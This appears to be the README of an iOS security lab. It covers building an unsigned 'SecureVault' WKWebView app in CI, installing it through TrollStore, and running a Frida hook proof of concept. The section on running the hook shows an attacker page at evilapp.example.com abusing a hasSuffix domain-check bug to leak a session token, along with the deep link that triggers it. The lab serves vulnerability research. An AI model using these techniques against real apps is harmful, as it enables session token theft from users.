# SecureVault — build & install (TrollStore path)

Target: **jailbroken iPhone + TrollStore**. We build an **unsigned** `.ipa` on a
macOS GitHub runner (no Mac needed, no Apple cert needed), then hand it to
TrollStore over HTTP.

```
Windows (you)                      GitHub Actions (macos-14)         iPhone
git push  ─────────────────────►   xcodegen + xcodebuild
                                   → SecureVault-unsigned.ipa
download artifact  ◄───────────────  (upload-artifact)
serve-ipa.ps1 (LAN HTTP)  ─────────────────────────────────────►  TrollStore install
                                                                  frida -U -l hook.js
```

---

## 1. Push this folder to a GitHub repo

The `webview-lab/` folder is the repo root (it contains `project.yml` and
`.github/workflows/ios-build.yml`). From `D:\AOSP\ai\iOS\webview-lab`:

```powershell
git init
git add .
git commit -m "SecureVault restricted WKWebView lab + CI"
git branch -M main
# create an EMPTY repo on github.com first, then:
git remote add origin https://github.com/<you>/securevault-lab.git
git push -u origin main
```

(If you have the GitHub CLI: `winget install GitHub.cli; gh auth login; gh repo create securevault-lab --private --source . --push`.)

## 2. Let CI build it

Pushing to `main` triggers **build-unsigned-ipa**. Or run it manually:
GitHub → **Actions** → *build-unsigned-ipa* → **Run workflow**.

Wait for the green check (~2–4 min). Open the run → **Artifacts** →
download **`SecureVault-unsigned-ipa`** (a zip). Extract it to get
`SecureVault-unsigned.ipa` — put it in `webview-lab\`.

## 3. Get the IPA onto the iPhone (TrollStore)

Same Wi-Fi as the phone, then in `webview-lab\`:

```powershell
powershell -ExecutionPolicy Bypass -File scripts\serve-ipa.ps1 -IpaPath .\SecureVault-unsigned.ipa
```

It prints a green **TrollStore install URL** like:

```
apple-magnifier://install?url=http%3A%2F%2F192.168.x.x%3A8000%2FSecureVault-unsigned.ipa
```

Open that URL on the **iPhone** (paste into Safari, or AirDrop it to yourself) →
TrollStore pops up → **Install**. (Alternatively open the plain
`http://192.168.x.x:8000/SecureVault-unsigned.ipa` in Safari and choose *Open in
TrollStore*.)

Firewall: if Safari can't reach it, allow **python.exe** inbound on *Private*
networks, or use the **ngrok** fallback the script prints.

## 4. Run it / attach Frida

```powershell
frida-ps -U                       # list apps, confirm frida-server is up
frida -U -f com.example.securevault -l poc\hook.js
```

Expected once you load the attacker page (`https://evilapp.example.com/...`):

```
[*] ViewController -> SecureVault.ViewController
[+] forced ALLOW (was 0) -> https://evilapp.example.com/...
[TOKEN LEAK] native evaluated JS: window.__nativeCallback && window.__nativeCallback("eyJ...VICTIM_SESSION_TOKEN...");
```

Trigger the page on-device with:

```
securevault://open?url=https%3A%2F%2Fevilapp.example.com%2Fevilapp.example.com.html
```

(serve `poc/` on a host whose DNS name ends in `app.example.com`, or edit
`/etc/hosts` on the phone… simpler: use your LAN attacker server and a name that
satisfies the `hasSuffix` bug, e.g. host header `evilapp.example.com`.)

---

## Notes / gotchas

- **Why unsigned?** TrollStore re-signs on install with its own (permanent)
  signature, so `CODE_SIGNING_ALLOWED=NO` output is exactly what it wants.
- **No app icon / storyboard** is included on purpose; `@main` + the scene
  manifest in `Info.plist` boot the UI programmatically.
- **libimobiledevice 1.2.1** (the copy on this box) predates iOS 17+ and cannot
  see the phone (`idevice_id -l` empty). That does **not** matter for the
  TrollStore/HTTP path above. If you later want `ideviceinstaller` instead,
  upgrade to a current libimobiledevice build.
- The `project.yml` + workflow build a *device* (`iphoneos`) Release binary, not
  a simulator one — required for a real iPhone.
